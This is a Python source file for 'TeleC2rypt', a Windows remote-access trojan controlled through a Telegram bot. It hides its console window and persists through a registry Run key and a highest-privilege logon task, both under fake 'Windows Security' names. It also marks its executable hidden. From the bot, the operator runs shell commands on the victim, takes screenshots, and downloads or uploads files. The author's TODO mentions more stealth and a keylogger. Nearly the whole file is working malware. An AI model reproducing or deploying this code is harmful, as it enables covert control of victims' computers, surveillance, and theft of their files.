#!/usr/bin/env python3
# TeleC2rypt by Da7rkx0
# started: jan 2024
# v1.0.3 - fixed some stuff and added new features
#        - finally got persistence working properly
#        - added better error handling (kinda)
# 
# TODO: 
# - add more stealth features
# - maybe add keylogger?
# - fix that weird bug with long commands
# - clean up this mess someday lol

import os, sys, subprocess
import winreg  # windows stuff
from telegram import Update
from telegram.ext import *  # yeah i know, but whatever
from dotenv import load_dotenv
import pyautogui  # screenshots
import tempfile
from datetime import datetime
import ctypes  # windows api
import platform

# load settings
load_dotenv()  # make sure .env exists!

# bot config - DONT TOUCH THESE
token = os.getenv('TELEGRAM_TOKEN')  # bot token from @botfather
admin = os.getenv('ALLOWED_USER_ID')  # your telegram id

# Command list with some duplicates and typos
allowed = {
    'whoami',
    'systeminfo',
    'hostname',
    'ver',
    'query',
    'wmic',
    'ipconfig',
    'netstat',
    'ping',
    'tracert',
    'nslookup',
    'netsh',
    'route',
    'arp',
    'nbtstat',
    'net view',
    'tasklist',
    'taskkill',
    'wmic process',
    'dir',
    'type',
    'copy',
    'del',
    'move',
    'mkdir',
    'rmdir',
    'tree',
    'attrib',
    'comp',
    'compact',
    'expand',
    'find',
    'findstr',
    'sc',
    'net start',
    'net stop',
    'net user',
    'net localgroup',
    'net accounts',
    'net session',
    'net share',
    'net use',
    'schtasks',
    'at',
    'reg',
    'reg query',
    'reg add',
    'shutdown',
    'logoff',
    'restart',
    'dism',
    'sfc',
    'chkdsk',
    'netsh advfirewall',
    'netsh interface',
    'netsh wlan',
    'wevtutil',
    'eventvwr',
    'perfmon',
    'typeperf',
    'powercfg',
    'diskpart',
    'defrag',
    'fsutil',
    'cacls',
    'icacls',
    'cipher',
    'whoami',  # duplicate
    'ipconfig',  # duplicate
    'netsh',  # duplicate with typo
    'netsh',  # duplicate
    'ne tsh',  # typo
}

def hide():
    """hide console window"""
    if sys.platform == 'win32':  # windows only duh
        k32 = ctypes.WinDLL('kernel32')
        u32 = ctypes.WinDLL('user32')
        hwnd = k32.GetConsoleWindow()
        if hwnd:
            u32.ShowWindow(hwnd, 0)

def persist():
    """adds persistence in registry + task
    pretty stealthy tbh"""
    try:
        # registry key
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        name = "Windows Security Service"  # looks legit
        
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as reg:
            winreg.SetValueEx(reg, name, 0, winreg.REG_SZ, sys.executable)
        # Alternative method (commented out)
        # with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key) as reg:
        #     winreg.SetValueEx(reg, name, 0, winreg.REG_SZ, sys.executable)
        
        # scheduled task backup
        task = "WindowsSecurityUpdate"  # also legit
        subprocess.run([
            'schtasks', '/create', '/tn', task,
            '/tr', f'"{sys.executable}"',
            '/sc', 'onlogon',
            '/rl', 'HIGHEST',
            '/f'
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        # hide exe
        if getattr(sys, 'frozen', False):  # only if compiled
            os.system(f'attrib +h "{sys.executable}"')
            
    except Exception as e:
        print(f"[-] persistence failed: {e}")

def is_admin(uid: str) -> bool:
    """check if user is allowed"""
    return str(uid) == admin

def check_cmd(cmd: str) -> bool:
    """validate command"""
    base = cmd.split()[0].lower()
    if any(cmd.startswith(x) for x in allowed):
        return True
    raise ValueError(f'nope, {base} not allowed ;)')

async def run(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """execute command"""
    if not is_admin(str(update.effective_user.id)):
        await update.message.reply_text('⛔ nah')
        return
    
    try:
        cmd = update.message.text
        check_cmd(cmd)
        
        # run it
        p = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30  # dont hang
        )
        
        # format output
        out = f"📟 Output:\n\n"
        if p.stdout:
            out += f"STDOUT:\n{p.stdout}\n"
        if p.stderr:
            out += f"STDERR:\n{p.stderr}"
            
        # handle long output
        max_len = 4000  # telegram limit
        if len(out) > max_len:
            chunks = [out[i:i+max_len] for i in range(0, len(out), max_len)]
            for i, chunk in enumerate(chunks, 1):
                await update.message.reply_text(f"Part {i}/{len(chunks)}:\n{chunk}")
        else:
            await update.message.reply_text(out)
            
    except ValueError as ve:
        await update.message.reply_text(f"Value error: {ve}")
    except Exception as e:
        await update.message.reply_text(f"General error: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """welcome message"""
    if not is_admin(str(update.effective_user.id)):
        return
        
    # get info
    sys = platform.platform()
    user = os.getenv('USERNAME')
    pc = os.getenv('COMPUTERNAME')
    
    msg = f"""🟢 Connected!

💻 System: {sys}
👤 User: {user}
🖥️ PC: {pc}
⚡ Status: Ready

/help for commands"""
    
    await update.message.reply_text(msg)

async def screen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """grab screenshot"""
    if not is_admin(str(update.effective_user.id)):
        return
        
    try:
        await update.message.reply_chat_action(ChatAction.UPLOAD_PHOTO)
        
        # save temp file
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        tmp = os.path.join(tempfile.gettempdir(), f'sc_{ts}.png')
        
        ss = pyautogui.screenshot()
        ss.save(tmp)
        
        # send it
        with open(tmp, 'rb') as img:
            await update.message.reply_photo(
                photo=img,
                caption=f'📸 Got it! ({ts})'
            )
        
        # cleanup
        os.remove(tmp)
        
    except Exception as e:
        await update.message.reply_text(f"❌ failed: {str(e)}")

async def dl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """download file"""
    if not is_admin(str(update.effective_user.id)):
        return
        
    if not context.args:
        await update.message.reply_text('⚠️ need a path')
        return
        
    path = ' '.join(context.args)
    
    try:
        # check file
        if not os.path.exists(path):
            await update.message.reply_text('❌ not found')
            return
            
        # size check
        if os.path.getsize(path) > 50*1024*1024:  # 50mb
            await update.message.reply_text('⚠️ too big (>50mb)')
            return
            
        # send it
        await update.message.reply_chat_action(ChatAction.UPLOAD_DOCUMENT)
        with open(path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=os.path.basename(path),
                caption=f'📁 {path}'
            )
            
    except Exception as e:
        await update.message.reply_text(f"❌ failed: {str(e)}")

async def ul(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """upload file"""
    if not is_admin(str(update.effective_user.id)):
        return
        
    if not update.message.document:
        await update.message.reply_text('⚠️ attach a file')
        return
        
    try:
        # save it
        f = await update.message.document.get_file()
        path = os.path.join(os.getcwd(), update.message.document.file_name)
        await f.download_to_drive(path)
        await update.message.reply_text(f'✅ saved: {path}')
        
    except Exception as e:
        await update.message.reply_text(f"❌ failed: {str(e)}")

async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """show commands"""
    if not is_admin(str(update.effective_user.id)):
        return
        
    # group commands
    cmds = {
        '💻 System': ['whoami', 'systeminfo', 'hostname', 'ver', 'query', 'wmic'],
        '🌐 Network': ['ipconfig', 'netstat', 'ping', 'tracert', 'nslookup', 'netsh', 'route', 'arp'],
        '⚙️ Processes': ['tasklist', 'taskkill', 'wmic process'],
        '📁 Files': ['dir', 'type', 'copy', 'del', 'move', 'mkdir', 'rmdir', 'tree'],
        '🔧 Services': ['sc', 'net start', 'net stop'],
        '👥 Users': ['net user', 'net localgroup', 'net accounts'],
        '⏰ Tasks': ['schtasks', 'at'],
        '📝 Registry': ['reg query', 'reg add'],
        '🔄 Power': ['shutdown', 'logoff', 'restart'],
        '🛠️ Tools': ['dism', 'sfc', 'chkdsk', 'diskpart'],
        '🔒 Security': ['cacls', 'icacls', 'cipher'],
        '📷 Special': [
            '/screen - take pic',
            '/dl <path> - get file',
            '/ul - send file (attach)'
        ]
    }
    
    # build help msg
    txt = '📚 Commands:\n\n'
    for cat, commands in cmds.items():
        txt += f"{cat}:\n" + '\n'.join(f"  • {cmd}" for cmd in commands) + '\n\n'
    
    # split if needed
    if len(txt) > 4096:  # telegram limit
        for i in range(0, len(txt), 4096):
            await update.message.reply_text(txt[i:i+4096])
    else:
        await update.message.reply_text(txt)

def main():
    """start bot"""
    try:
        # setup
        hide()
        persist()
        
        # init bot
        print("[+] starting...")
        app = Application.builder().token(token).build()
        
        # add handlers
        app.add_handler(CommandHandler('start', start))
        app.add_handler(CommandHandler('help', help))
        app.add_handler(CommandHandler('screen', screen))
        app.add_handler(CommandHandler('dl', dl))
        app.add_handler(CommandHandler('ul', ul))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, run))
        
        # go!
        print("[+] ready!")
        app.run_polling()
        
    except Exception as e:
        # shhh
        pass

if __name__ == '__main__':
    main()
